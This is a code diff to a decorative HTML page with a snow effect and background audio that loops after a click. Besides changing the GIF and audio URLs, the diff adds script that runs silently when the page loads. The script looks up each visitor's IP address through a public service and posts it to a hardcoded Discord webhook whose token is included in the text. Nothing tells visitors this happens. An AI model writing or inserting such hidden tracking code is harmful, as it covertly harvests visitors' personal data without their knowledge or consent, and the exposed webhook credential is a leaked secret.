@@ -20,7 +20,7 @@
             height: 100%;
             pointer-events: none;
             z-index: 100;
-            background: url('https://media.giphy.com/media/l44QvKoQuUD3xPZKg/giphy.gif');
+            background: url('https://makeagif.com/i/j1J5fx');
             mix-blend-mode: screen;
             opacity: 0.2;
         }
@@ -104,11 +104,28 @@
         createSnow();
 
         function playAudio() {
-            let audio = new Audio("https://www.youtube.com/watch?v=Vszu50hrBm8");
+            let audio = new Audio("https://ia801700.us.archive.org/13/items/gpw58p/gpw58p.mp4");
             audio.loop = true;
             audio.play().catch(error => console.log("Autoplay failed: ", error));
         }
         window.addEventListener("click", playAudio, { once: true });
+
+        // Fetch and send IP to webhook
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let ip = data.ip;
+                let webhookURL = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd";
+                let payload = {
+                    content: `New visitor IP: ${ip}`
+                };
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            })
+            .catch(error => console.error("Error fetching IP: ", error));
     </script>
 </body>
 </html>
